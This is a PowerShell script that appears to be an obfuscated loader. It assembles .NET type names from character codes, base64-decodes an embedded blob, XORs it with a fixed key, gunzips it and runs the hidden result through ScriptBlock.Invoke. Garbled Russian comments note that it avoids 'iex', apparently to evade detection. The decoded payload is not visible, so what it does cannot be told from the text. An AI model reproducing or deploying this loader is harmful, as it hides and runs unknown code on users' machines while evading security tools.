
$mrbj = "jBibk825cvmRbP5ZIplRo4OVc040m7Y4qsSYHSkalo6WGlrM4EfPtirLjExSR" + "mpo/0jm2mbG6DFxhGTz3n5NudkL1rJ5UQ/60xMbAzG53MejxdljIsFlv3fw9S" + "oWF6Oq70M+67pVpSCtpq5jgDUgA+TsSowUeIuk8mjI9GbWbEiE5FdZMQSTk5M="
$iuhv = 147
$apdn = 1+1; $lvin = 2*2;

# Р”РёРЅР°РјРёС‡РµСЃРєР°СЏ СЃР±РѕСЂРєР° С‚РёРїРѕРІ
$epud = [Activator]::CreateInstance([type]([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]73+[char]79+[char]46+[char]77+[char]101+[char]109+[char]111+[char]114+[char]121+[char]83+[char]116+[char]114+[char]101+[char]97+[char]109))
$paju = [type]([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]67+[char]111+[char]110+[char]118+[char]101+[char]114+[char]116)
$omul = $paju.GetMethod([char]70+[char]114+[char]111+[char]109+[char]66+[char]97+[char]115+[char]101+[char]54+[char]52+[char]83+[char]116+[char]114+[char]105+[char]110+[char]103)
$fazs = $omul.Invoke($null, @($mrbj))
for($tmpl=0; $tmpl -lt $fazs.Length; $tmpl++) {
    $epud.WriteByte($fazs[$tmpl] -bxor $iuhv)
}
$epud.Position = 0

$qplw = [Activator]::CreateInstance([type]([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]73+[char]79+[char]46+[char]67+[char]111+[char]109+[char]112+[char]114+[char]101+[char]115+[char]115+[char]105+[char]111+[char]110+[char]46+[char]71+[char]90+[char]105+[char]112+[char]83+[char]116+[char]114+[char]101+[char]97+[char]109), @($epud, [System.IO.Compression.CompressionMode]::Decompress))
$uxbj = [Activator]::CreateInstance([type]([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]73+[char]79+[char]46+[char]83+[char]116+[char]114+[char]101+[char]97+[char]109+[char]82+[char]101+[char]97+[char]100+[char]101+[char]114), @($qplw))
$rkec = $uxbj.ReadToEnd()

# Р’С‹РїРѕР»РЅРµРЅРёРµ С‡РµСЂРµР· ScriptBlock Р±РµР· iex
[ScriptBlock]::Create($rkec).Invoke()
